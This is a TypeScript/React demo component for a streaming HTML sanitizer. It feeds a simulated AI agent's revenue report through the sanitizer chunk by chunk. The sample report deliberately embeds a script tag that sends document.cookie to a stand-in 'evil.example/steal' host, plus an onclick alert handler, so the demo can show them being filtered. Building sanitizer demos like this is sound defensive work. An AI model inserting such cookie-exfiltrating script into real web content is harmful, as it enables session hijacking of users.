import {
  SceneStore,
  StreamCoalescer,
  StreamingIngestion,
  type ArtifactHandle,
} from "@dopejs/deckle";
import { StreamingSanitizer } from "@dopejs/deckle-security";
import { useEffect, useRef, useState, type ReactNode } from "react";

export const DEMO_AGENT_OUTPUT =
  '<section class="report">' +
  "<h2>Q3 revenue</h2>" +
  "<p>Revenue reached <strong>$4.2M</strong>, up 12% quarter over quarter.</p>" +
  "<ul><li>Subscriptions: $3.1M</li><li>Services: $1.1M</li></ul>" +
  '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>' +
  "<table><tr><th>Segment</th><th>Growth</th></tr>" +
  "<tr><td>Enterprise</td><td>18%</td></tr><tr><td>Self-serve</td><td>7%</td></tr></table>" +
  '<p onclick="alert(1)">Full breakdown in the appendix.</p>' +
  "</section>";

export function tokenizeDemoStream(text: string): string[] {
  const chunks: string[] = [];
  let index = 0;
  let step = 3;
  while (index < text.length) {
    chunks.push(text.slice(index, index + step));
    index += step;
    step = (step % 7) + 2;
  }
  return chunks;
}

interface StreamingSession {
  readonly store: SceneStore;
  readonly handle: ArtifactHandle;
  readonly sanitizer: StreamingSanitizer;
  readonly ingestion: StreamingIngestion;
  readonly chunks: readonly string[];
  cursor: number;
  clock: number;
  html: string;
}

interface StreamingView {
  readonly source: string;
  readonly safeLength: number;
  readonly html: string;
  readonly lifecycle: string;
  readonly pins: string;
  readonly pending: string;
  readonly sourceRevision: number;
  readonly draftRevision: number;
  readonly paintRevision: number;
  readonly diagnostics: number;
  readonly complete: boolean;
}

const EMPTY_VIEW: StreamingView = {
  source: "",
  safeLength: 0,
  html: "",
  lifecycle: "loading",
  pins: "loading",
  pending: "—",
  sourceRevision: 0,
  draftRevision: 0,
  paintRevision: 0,
  diagnostics: 0,
  complete: false,
};

export interface StreamingDemoLabels {
  readonly play: string;
  readonly pause: string;
  readonly step: string;
  readonly reset: string;
  readonly speed: string;
  readonly source: string;
  readonly output: string;
}

function newSession(): StreamingSession {
  const store = new SceneStore();
  const handle = store.transact((transaction) =>
    transaction.createArtifact("agent-report", {
      x: 0,
      y: 0,
      width: 640,
      height: 480,
      zIndex: 0,
    }),
  );
  const sanitizer = new StreamingSanitizer();
  return {
    store,
    handle,
    sanitizer,
    ingestion: new StreamingIngestion(
      store,
      handle,
      sanitizer,
      new StreamCoalescer({ minIntervalMs: 40, minChars: 48 }),
    ),
    chunks: tokenizeDemoStream(DEMO_AGENT_OUTPUT),
    cursor: 0,
    clock: 0,
    html: "",
  };
}

function viewOf(session: StreamingSession): StreamingView {
  const update = session.sanitizer.current;
  const record = session.store.get(session.handle);
  return {
    source: session.sanitizer.source,
    safeLength: update.safeLength,
    html: session.html,
    lifecycle: record.lifecycle,
    pins: record.pins.join(", ") || "none",
    pending: update.pending ?? "—",
    sourceRevision: record.revisions.sourceRevision,
    draftRevision: record.revisions.draftRevision,
    paintRevision: record.revisions.paintRevision,
    diagnostics: update.diagnostics.length,
    complete: session.ingestion.settled,
  };
}

export function StreamingDemo({ labels }: { readonly labels: StreamingDemoLabels }): ReactNode {
  const sessionRef = useRef<StreamingSession | null>(null);
  const timerRef = useRef<number | null>(null);
  const speedRef = useRef(28);
  const [view, setView] = useState<StreamingView>(EMPTY_VIEW);
  const [playing, setPlaying] = useState(false);
  const [speed, setSpeed] = useState(28);

  const stop = (): void => {
    if (timerRef.current !== null) {
      window.clearInterval(timerRef.current);
      timerRef.current = null;
    }
    setPlaying(false);
  };

  const reset = (): void => {
    stop();
    const session = newSession();
    sessionRef.current = session;
    setView(viewOf(session));
  };

  const advance = (): boolean => {
    const session = sessionRef.current;
    if (session === null) return false;
    if (session.cursor >= session.chunks.length) {
      if (!session.ingestion.settled) {
        const result = session.ingestion.finish();
        session.html = result.html;
        setView(viewOf(session));
      }
      return false;
    }

    session.clock += speedRef.current || 1;
    const result = session.ingestion.push(session.chunks[session.cursor]!, session.clock);
    session.cursor += 1;
    if (result.rendered) session.html = result.html;
    setView(viewOf(session));
    return true;
  };

  const start = (): void => {
    if (timerRef.current !== null) return;
    setPlaying(true);
    timerRef.current = window.setInterval(
      () => {
        if (advance()) return;
        stop();
      },
      Math.max(8, speedRef.current),
    );
  };

  useEffect(() => {
    const session = newSession();
    sessionRef.current = session;
    setView(viewOf(session));
    return () => {
      if (timerRef.current !== null) window.clearInterval(timerRef.current);
    };
  }, []);

  return (
    <div className="demo-stage demo-stage--streaming">
      <div className="demo-controls">
        <button
          type="button"
          disabled={view.complete}
          onClick={() => {
            if (playing) stop();
            else start();
          }}
        >
          {playing ? labels.pause : labels.play}
        </button>
        <button
          type="button"
          disabled={view.complete}
          onClick={() => {
            stop();
            advance();
          }}
        >
          {labels.step}
        </button>
        <button type="button" onClick={reset}>
          {labels.reset}
        </button>
        <label>
          <span>{labels.speed}</span>
          <input
            type="range"
            min="8"
            max="100"
            value={speed}
            onChange={(event) => {
              const next = Number(event.currentTarget.value);
              speedRef.current = next;
              setSpeed(next);
              if (timerRef.current !== null) {
                stop();
                start();
              }
            }}
          />
          <output>{speed} ms</output>
        </label>
      </div>

      <dl className="demo-hud demo-hud--streaming" aria-live="polite">
        <div>
          <dt>lifecycle / pins</dt>
          <dd>
            {view.lifecycle} / {view.pins}
          </dd>
        </div>
        <div>
          <dt>received / safe</dt>
          <dd>
            {view.source.length} / {view.safeLength}
          </dd>
        </div>
        <div>
          <dt>pending</dt>
          <dd>{view.pending}</dd>
        </div>
        <div>
          <dt>source / draft / paint</dt>
          <dd>
            {view.sourceRevision} / {view.draftRevision} / {view.paintRevision}
          </dd>
        </div>
      </dl>

      <div className="stream-panes">
        <section>
          <h3>{labels.source}</h3>
          <pre className="stream-source">
            <span>{view.source.slice(0, view.safeLength)}</span>
            <mark>{view.source.slice(view.safeLength)}</mark>
          </pre>
        </section>
        <section>
          <h3>
            {labels.output} <span>{view.diagnostics} diagnostics</span>
          </h3>
          <div
            className="stream-output"
            // The engine only publishes HTML returned by StreamingSanitizer.
            dangerouslySetInnerHTML={{ __html: view.html }}
          />
        </section>
      </div>
    </div>
  );
}
